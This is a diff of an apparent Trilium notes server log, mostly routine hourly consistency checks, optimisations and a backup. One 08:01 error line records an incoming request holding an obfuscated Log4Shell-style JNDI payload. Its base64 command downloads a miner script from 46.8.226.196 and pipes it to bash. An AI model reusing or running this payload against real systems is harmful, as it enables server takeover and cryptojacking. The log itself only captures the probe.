@@ -8,3 +8,49 @@
 03:21:58.836 Optimization finished in 1ms.
 03:21:59.399 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
 03:21:59.414 All consistency checks passed with no errors detected (took 15ms)
+04:21:59.416 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+04:21:59.428 All consistency checks passed with no errors detected (took 12ms)
+05:21:59.417 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+05:21:59.428 All consistency checks passed with no errors detected (took 11ms)
+06:21:59.431 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+06:21:59.444 All consistency checks passed with no errors detected (took 13ms)
+07:21:59.432 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+07:21:59.445 All consistency checks passed with no errors detected (took 13ms)
+08:01:13.825 Error: Router not found for request GET /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//46.8.226.196:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMjYuMTk2L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjI2LjE5Ni9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==%7D%27%29
+08:21:59.443 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+08:21:59.456 All consistency checks passed with no errors detected (took 13ms)
+09:21:58.998 Created backup at /root/.local/share/trilium-data/backup/backup-weekly.db
+09:21:59.443 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+09:21:59.456 All consistency checks passed with no errors detected (took 13ms)
+10:21:59.449 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+10:21:59.462 All consistency checks passed with no errors detected (took 14ms)
+11:21:59.455 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+11:21:59.465 All consistency checks passed with no errors detected (took 10ms)
+12:21:59.460 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+12:21:59.470 All consistency checks passed with no errors detected (took 9ms)
+13:21:58.836 Optimizing database
+13:21:58.840 Optimization finished in 1ms.
+13:21:59.461 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+13:21:59.473 All consistency checks passed with no errors detected (took 12ms)
+14:21:59.462 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+14:21:59.474 All consistency checks passed with no errors detected (took 13ms)
+15:21:59.493 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+15:21:59.508 All consistency checks passed with no errors detected (took 16ms)
+16:21:59.521 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+16:21:59.539 All consistency checks passed with no errors detected (took 18ms)
+17:21:59.522 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+17:21:59.535 All consistency checks passed with no errors detected (took 13ms)
+18:21:59.545 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+18:21:59.556 All consistency checks passed with no errors detected (took 11ms)
+19:21:59.571 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+19:21:59.590 All consistency checks passed with no errors detected (took 20ms)
+20:21:59.591 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+20:21:59.605 All consistency checks passed with no errors detected (took 14ms)
+21:21:59.592 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+21:21:59.606 All consistency checks passed with no errors detected (took 14ms)
+22:21:59.611 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+22:21:59.626 All consistency checks passed with no errors detected (took 16ms)
+23:21:58.850 Optimizing database
+23:21:58.854 Optimization finished in 1ms.
+23:21:59.611 Table counts: notes: 286, revisions: 17, attachments: 40, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 226
+23:21:59.627 All consistency checks passed with no errors detected (took 17ms)
